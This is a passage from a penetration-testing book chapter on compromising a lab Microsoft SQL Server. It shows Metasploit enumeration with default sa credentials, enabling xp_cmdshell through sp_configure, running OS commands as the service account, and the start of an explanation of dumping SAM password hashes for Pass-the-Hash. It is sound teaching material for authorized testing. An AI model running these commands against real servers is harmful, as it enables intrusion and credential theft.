mands and ultimately taking control of this system. It will be helpful to first have a
modest understanding of stored procedures and how they work.
6.1.1
MSSQL stored procedures
Think of stored procedures as you would think of methods or functions in computer
programming. If I’m a database administrator and my day-to-day operations involve
running complex SQL queries, then I probably want to store some of those queries in
Specifies the 
username
Specifies the password
The credentials are valid.
Why rhosts instead of rhost?
The auxiliary scanner modules in Metasploit take in the rhosts variable. This variable
can be set to either a range of IP addresses, such as 10.0.10.201-210; a single IP
address, as we’re using in the example; or the path to a file containing one or more
IP addresses or IP address ranges, each on its own line—something like file:
/home/pentest/ips.txt.
105
Compromising Microsoft SQL Server
a function or method that I can run over and over again by calling the name of the
function rather than typing the whole query each time I want to use it.
 In MSSQL-speak, these functions or methods are called stored procedures. As luck
would have it, MSSQL comes with a helpful set of premade stored procedures called
system stored procedures, which are intended to enhance the capabilities of MSSQL and,
in some cases, allow you to interact with the host-level OS. (If you’re interested in
learning more about system stored procedures, check out the Microsoft Docs page at
http://mng.bz/6Aee.)
 One particular system stored procedure, xp_cmdshell, takes an OS command as
an argument, runs the command in the context of the user account that is running
the MSSQL server, and then displays the output of the command in a raw SQL
response. Due to the abuse of this stored procedure by hackers (and pentesters) over
the years, Microsoft has opted to disable it by default. You can check to see if it’s
enabled on your target server using the mssql_enum Metasploit module.
6.1.2
Enumerating MSSQL servers with Metasploit
In the msfconsole, switch from the mssql_login module to the mssql_enum module
with use auxiliary/scanner/mssql/mssql_enum, and specify the rhosts, username,
and password variables just as you did previously. Run the module to see information
about the server’s configuration. Toward the top of the module output, you will see
the results for xp_cmdshell. In this case, this stored procedure is not enabled and can-
not be used to execute OS commands.
msf5 auxiliary(scanner/mssql/mssql_login) > use
auxiliary/admin/mssql/mssql_enum
msf5 auxiliary(admin/mssql/mssql_enum) > set rhosts 10.0.10.201
rhosts => 10.0.10.201
msf5 auxiliary(admin/mssql/mssql_enum) > set username sa
username => sa
msf5 auxiliary(admin/mssql/mssql_enum) > set password Password1
password => Password1
msf5 auxiliary(admin/mssql/mssql_enum) > run
[*] Running module against 10.0.10.201
[*] 10.0.10.201:1433 - Running MS SQL Server Enumeration...
[*] 10.0.10.201:1433 - Version:
[*]     Microsoft SQL Server 2014 (SP3) (KB4022619) - 12.0.6024.0 (X64)
[*]             Sep  7 2018 01:37:51
[*]             Copyright (c) Microsoft Corporation
[*]             Enterprise Evaluation Edition (64-bit) on Windows NT 6.3
 (Build 14393: ) (Hypervisor)
[*] 10.0.10.201:1433 - Configuration Parameters:
[*] 10.0.10.201:1433 -  C2 Audit Mode is Not Enabled
[*] 10.0.10.201:1433 -  xp_cmdshell is Not Enabled 
[*] 10.0.10.201:1433 -  remote access is Enabled
[*] 10.0.10.201:1433 -  allow updates is Not Enabled
Listing 6.2
Checking whether xp_cmdshell is enabled on the MSSQL server 
xp_cmdshell is not 
currently enabled.
106
CHAPTER 6
Attacking vulnerable database services
[*] 10.0.10.201:1433 -  Database Mail XPs is Not Enabled
[*] 10.0.10.201:1433 -  Ole Automation Procedures are Not Enabled
[*] 10.0.10.201:1433 - Databases on the server:
[*] 10.0.10.201:1433 -  Database name:master
[*] 10.0.10.201:1433 -  Database Files for master:
[*] 10.0.10.201:1433 -          C:\Program Files\Microsoft SQL 
[*] 10.0.10.201:1433 -          C:\Program Files\Microsoft SQL 
[*] 10.0.10.201:1433 -  sp_replincrementlsn
[*] 10.0.10.201:1433 - Instances found on this server:
[*] 10.0.10.201:1433 -  MSSQLSERVER
[*] 10.0.10.201:1433 - Default Server Instance SQL Server Service is
running under the privilege of:
[*] 10.0.10.201:1433 -  NT Service\MSSQLSERVER
[*] Auxiliary module execution completed
msf5 auxiliary(admin/mssql/mssql_enum) >
NOTE
The mssql_exec Metasploit module checks to see whether xp_cmdshell
is enabled and, if it isn’t, enables it for you automatically. This is super cool, but
I want you to understand how to do it yourself. You might one day find yourself
accessing an MSSQL server indirectly by taking advantage of an SQL-injection
vulnerability, which is another topic for another book. In that case, though,
it would be easier to manually enable xp_cmdshell, so that’s what you learn
to do next.
6.1.3
Enabling xp_cmdshell
Even if the xp_cmdshell stored procedure is disabled, as long as you have the sa
account (or another account with administrator access to the database server), you
can enable it with a couple of MSSQL commands. One of the easiest ways to accom-
plish this is to use an MSSQL client to connect directly to the database server and
issue the commands one by one. There is a fantastic command-line interface (CLI)
called mssql-cli, which is written in Python and can be installed using pip install
mssql-cli.
~$ pip install mssql-cli  
Collecting mssql-cli
  Using cached
https://files.pythonhosted.org/packages/03/57/84ef941141765ce8e32b9c1d2259
00bea429f0aca197ca56504ec482da5/mssql_cli-0.16.0-py2.py3-none
manylinux1_x86_64.whl
Requirement already satisfied: sqlparse=0.2.2 in
/usr/local/lib/python2.7/dist-packages (from mssql-cli) (0.2.4)
Collecting configobj>=5.0.6 (from mssql-cli)
Requirement already satisfied: enum34>=1.1.6 in
./.local/lib/python2.7/site-packages (from mssql-cli) (1.1.6)
Collecting applicationinsights>=0.11.1 (from mssql-cli)
  Using cached
https://files.pythonhosted.org/packages/a1/53/234c53004f71f0717d8acd37876e
Listing 6.3
Installing mssql-cli with pip
Installing mssql-cli 
using pip
107
Compromising Microsoft SQL Server
b65c121181167057b9ce1b1795f96a0/applicationinsights-0.11.9-py2.py3-none-
any.whl
.... [OUTPUT TRIMMED] ....
Collecting backports.csv>=1.0.0 (from cli-helpers=0.2.3->mssql-cli)
  Using cached
https://files.pythonhosted.org/packages/8e/26/a6bd68f13e0f38fbb643d6e497fc
462be83a0b6c4d43425c78bb51a7291/backports.csv-1.0.7-py2.py3-none-any.whl
Installing collected packages: configobj, applicationinsights, Pygments,
humanize, wcwidth, prompt-toolkit, terminaltables, backports.csv, cli
helpers, mssql-cli
Successfully installed Pygments-2.4.2 applicationinsights-0.11.9
backports.csv-1.0.7 cli-helpers-0.2.3 configobj-5.0.6 humanize-0.5.1 mssql
cli-0.16.0 prompt-toolkit-2.0.9 terminaltables-3.1.0 wcwidth-0.1.7
You can find additional documentation about this project on the GitHub page: https://
github.com/dbcli/mssql-cli. Once you have it installed, you can connect directly to the
target MSSQL server by using the command mssql-cli -S 10.0.10.201 -U sa and
then entering the sa password at the prompt.
Telemetry
---------
By default, mssql-cli collects usage data in order to improve your 
experience.
The data is anonymous and does not include commandline argument values.
The data is collected by Microsoft.
Disable telemetry collection by setting environment variable 
MSSQL_CLI_TELEMETRY_OPTOUT to 'True' or '1'.
Microsoft Privacy statement: https://privacy.microsoft.com/privacystatement
Password: 
Version: 0.16.0
Mail: PI:EMAIL
Home: http://github.com/dbcli/mssql-cli
master>  
After typing the command to connect to the MSSQL server, you are greeted with a
prompt that accepts valid SQL syntax, just as if you were sitting in front of the database
administrator console on the server. The xp_cmdshell stored procedure is considered
an advanced option by the MSSQL server. So, to configure the stored procedure, you
first need to enable advanced options by issuing the command sp_configure 'show
advanced options', '1'. Before this update will take effect, you must reconfigure the
MSSQL server with the RECONFIGURE command.
Listing 6.4
Connecting to the database using mssql-cli
108
CHAPTER 6
Attacking vulnerable database services
master> sp_configure 'show advanced options', '1'    
Configuration option 'show advanced options' changed from 0 to 1. Run the
RECONFIGURE statement to install.
Time: 0.256s
master> RECONFIGURE           
Commands completed successfully.
Time: 0.258s
NOTE
Record this in your engagement notes. This is a configuration change.
You will need to reverse this change during post-engagement cleanup.
Now that advanced options have been enabled, you can turn on the xp_cmdshell
stored procedure by running the command sp_configure 'xp_cmdshell', '1' in
your mssql-cli prompt. You need to issue the RECONFIGURE command a second time
for this change to take effect as well.
master> sp_configure 'xp_cmdshell', '1'    
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE 
statement to install.
Time: 0.253s
master> RECONFIGURE    
Commands completed successfully.
Time: 0.253s
master>
6.1.4
Running OS commands with xp_cmdshell
Now your target MSSQL server can be used as a means to run OS commands on the
system that’s hosting the database server. This level of access is another example of a
non-interactive shell. As with the example in the last chapter, you can’t use interactive
commands that require you to respond to a prompt, but you can execute one-line
commands by making a call to the master..xp_cmdshell stored procedure and pass-
ing in your OS command as a string parameter. 
Listing 6.5
Enabling advanced options
Listing 6.6
Enabling xp_cmdshell
Sets the value for the show
advanced options setting to 1
Reconfigures the database 
server with this new setting
Enables the xp_cmdshell
stored procedure
Reconfigures the 
database server
What about a graphical option?
If you find the idea of living in a terminal prompt for 40 hours a little intimidating, I
don’t blame you, although I encourage you to stick with it until it becomes comfort-
able. That said, many people prefer a graphical user interface (GUI)-based method,
and I won’t hold it against you if you do as well. Check out the DBeaver project at
https://dbeaver.io for a Debian package you can install on your Ubuntu VM.
109
Compromising Microsoft SQL Server
NOTE
The exec statement requires the full absolute path to a stored proce-
dure. Because the xp_cmdshell stored procedure is stored in the master data-
base, you have to call the method with master..xp_cmdshell to execute the
stored procedure.
As always, one of your first concerns as a pentester is to determine what level of access
you have on a compromised system—that is, the permission level with which the data-
base server is running. To see the context for running these commands, you can issue
the whoami command as follows:
master> exec master..xp_cmdshell 'whoami' 
In this example, the database server is running with the permissions of the mssql-
server service, as evidenced in the following output:
+------------------------+
| output                 |
|------------------------|
| nt service\mssqlserver | 
| NULL                   |
+------------------------+
(2 rows affected)
Time: 0.462s
master>
The next thing to do is determine what level of access this account has on the target
Windows server. Because it’s a service account, you cannot simply query the account
group membership status with net user as you would a normal user account, but the
service account will appear in any group queries it belongs to. Let’s see if this user is a
member of the local administrator group. Use xp_cmdshell to run net localgroup
administrators. On this server, you can see from the output in listing 6.7 that the
mssqlserver service account is a local administrator on this Windows machine.
master> exec master..xp_cmdshell 'net localgroup administrators'   
+------------------------------------------------------------------------+
| output                                                                 |
|------------------------------------------------------------------------|
| Alias name     administrators                                          |
| Comment        Administrators have complete and unrestricted access    |
| NULL                                                                   |
| Members                                                                |
| NULL                                                                   |
| -----------------------------------------------------------            |
| Administrator                                                          |
| CAPSULECORP\Domain Admins                                              |
| CAPSULECORP\gohanadm                                                   |
| NT Service\MSSQLSERVER                                                 |
| The command completed successfully.                                    |
Listing 6.7
Identifying local administrators
The MSSQL service account 
has admin rights on the 
Windows machine.
110
CHAPTER 6
Attacking vulnerable database services
| NULL                                                                   |
| NULL                                                                   |
+------------------------------------------------------------------------+
(13 rows affected)
Time: 1.173s (a second)
master>
NOTE
At this point, you could use this access to execute the Sticky Keys back-
door from the previous chapter if you wanted to elevate to an interactive
shell. Since we’ve demonstrated that technique already, there is no need to
repeat it in this chapter. I would like to note, though, that for the sake of com-
promising this target, elevating to an interactive shell is purely a matter of
preference and not a requirement.
6.2
Stealing Windows account password hashes 
I want to take a moment to introduce the concept of harvesting Windows password
hashes from compromised machines. In a couple of chapters, when we start talking
about privilege escalation and lateral movement, you’re going to learn all about the
mighty Pass-the-Hash technique and how attackers and pentesters use it to move later-
ally from one vulnerable host to many due to local administrator account credentials
being shared across multiple systems on an enterprise network. 
 For now, I just want to show you what password hashes look like, where they are
stored, and how to obtain them. Assuming this was a real pentest and you found noth-
ing of interest in the database tables and didn’t uncover any valuable secrets from
browsing the filesystem, at the very least you should capture the local user account
password hashes from this system.
 Like many other OSs, Windows uses a cryptographic hashing function (CHF) that
uses complex mathematical algorithms to map password data of arbitrary size (your
password could be 12 characters long while mine is 16, and so on) to a bit string of
fixed length—32 characters in the case of Microsoft Windows. 
 The algorithm is a one-way function, meaning that even if I know the algorithm,
there is no way for me to reverse the function to produce the pre-hashed string. But if
that’s the case, how does Windows know if you’ve entered the correct password when
you’re trying to log in to a Windows system?
 The answer is that Windows knows the hashed equivalent of your password. That
value (the hash) is stored in the Security Accounts Manager (SAM) registry hive (at
least for local accounts). 
DEFINITION
According to Microsoft, a hive is a logical group of keys, subkeys,
and values in the registry that has a set of supporting files containing backups
of its data. See the Microsoft Docs page for additional details: http://mng
.bz/oRKZ. 
Domain account password hashes are stored in an extensible storage engine database
called NTDS.dit on Windows domain controllers, but that’s not important right now.
111
Stealing Windows account password hashes
What’s important is that when you type your credentials to authenticate to a Windows
machine (figure 6.1, A), a CHF is used to create a hash from the plain-text password
string that you entered (B). That hash, along with the username you provided, is com-
pared with all the entries in the user table in the SAM (C); if a matching entry is
found, then you are permitted to access the system (D). 
 It turns out that if you have local administrator access to a Windows system (which
the database service account mssqlserver does), you can dump the password hashes
from the SAM registry hive and use a technique known as Pass-the-Hash to authenti-
cate to any Windows system that uses those credentials. This is particularly useful to a
pentester because it removes the need to perform password cracking. 
 Maybe the local administrator password is 64 characters long and contains a ran-
domized sequence of lowercase letters, uppercase letters, numbers, and special char-
acters. Cracking this password would be nearly impossible (at least, in the year 2020),
but if you obtain the password hash, you don’t need to crack it. As far as Windows is
concerned, having the password hash is just as good as having the plain-text password.
 With that in mind, probably one of the most useful things to do, now that you have
compromised this MSSQL server, is to dump the local user account password hashes
from the SAM. This can be done by using the non-interactive shell with mssql-cli
and the xp_cmdshell system stored procedure.
6.2.1
Copying registry hives with reg.exe
Windows registry hive files are located in the C:\Windows\System32 directory. They are
protected by the OS and cannot be tampered with in any way, even by system